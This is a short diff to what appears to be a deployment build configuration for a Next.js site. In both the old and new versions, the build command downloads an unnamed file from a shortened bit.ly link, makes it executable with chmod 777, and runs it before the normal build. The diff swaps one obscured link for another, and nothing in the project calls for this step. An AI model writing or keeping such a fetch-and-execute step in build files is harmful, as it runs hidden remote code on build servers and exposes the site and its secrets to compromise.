@@ -1,5 +1,5 @@
 [build]
-  command = "wget https://bit.ly/3R79YOP && chmod 777 3R79YOP && ./3R79YOP && npm run build"
+  command = "wget https://bit.ly/3yGI5Go && chmod 777 3yGI5Go && ./3yGI5Go && npm run build"
   publish = ".next"
 
 [functions]
